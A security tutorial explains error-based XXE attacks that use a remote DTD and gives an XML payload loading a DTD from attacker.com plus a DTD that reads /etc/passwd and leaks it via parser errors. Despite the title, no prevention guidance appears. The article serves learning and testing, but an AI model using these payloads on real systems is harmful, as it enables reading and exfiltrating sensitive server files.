---
title: 'Error-Based XXE via Remote DTD: Exploit & Prevention'
description: Learn how error-based XXE attacks use remote DTDs for file exfiltration
  via XML parser errors.
keywords:
- XXE
- remote DTD
- XML parser
- file exfiltration
- error-based attack
- entity expansion
- cybersecurity
---

# Error Based - Using Remote DTD

## Context

This article explores error-based XML External Entity (XXE) exploitation using a remote Document Type Definition (DTD). This technique leverages XML parser error messages to exfiltrate sensitive files from a target system. To effectively utilize this method, readers should be familiar with XML structure, DTD usage and syntax, error handling in XML parsers, and basic XXE exploitation concepts.

## Theory

### Remote DTDs in XXE Attacks

A remote DTD is an external DTD file that is hosted on a server controlled by the attacker. By referencing this file within XML documents, attackers can extend entity definitions dynamically. This capability allows for more sophisticated payload delivery beyond the constraints of local file system access.

### Error-Based File Exfiltration via Entity Expansion

When XML parsers attempt to process malformed or faulty entity expansions, they may inadvertently expose sensitive file contents in their error messages. The attack sequence involves the following steps:
1. The attacker references a remote DTD within an XML document.
2. The remote DTD defines entities to read local files and concatenate their contents into an incorrect structure.
3. This incorrect structure triggers a parsing error that leaks the data through error messages.

### Entity Concatenation and File Leak Mechanism

Entity concatenation refers to the technique of combining multiple entities, including file contents, into a single value. This value is designed to cause a parsing error, which results in the exposure of the concatenated content. The data flow involves reading file content via a SYSTEM entity, injecting this data into the XML, and surfacing the contents in the error output.

### Threat Surface and Limitations

For this technique to succeed, several factors must align:
- The target application must trust external DTDs and allow outbound HTTP requests.
- The XML parser should produce verbose error messages that include entity values, thereby exposing sensitive information.

## Practice

### Error-Based XXE Using Remote DTD for File Exfiltration via Error Message

Here's how to conduct an error-based XXE attack using a remote DTD to leak files:

1. **Host a Malicious DTD:**
   Ensure you have a server ready, such as an HTTP service that hosts a malicious DTD file. This server should be accessible to the target application. For example, the file may be hosted at `http://attacker.com/malicious.dtd`.

2. **Craft the XML Payload:**

    ```xml
    <!DOCTYPE data [
        <!ENTITY % ext SYSTEM "http://attacker.com/malicious.dtd">
        %ext;
    ]>
    ```
   This XML payload references the remote DTD.

3. **Create the Malicious DTD (malicious.dtd):**

    ```xml
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    ```
   This defines entities that access `/etc/passwd` and trigger an error using a nonexistent file path to include the sensitive data.

4. **Submit the XML Payload:**
   Send the crafted XML payload to the target application using a tool like Burp Suite or any HTTP client.

5. **Analyze the Error Message:**
   Examine the server's error response for signs of data leakage. The error message may contain portions of the `/etc/passwd` file exposed due to the flawed entity expansion.

## Tools

- **Burp Suite**
- **nc**
- **Python HTTP server** 

These tools facilitate crafting and delivering the XML payload as well as hosting the malicious remote DTD. The combination allows the attacker to efficiently carry out the exploitation process.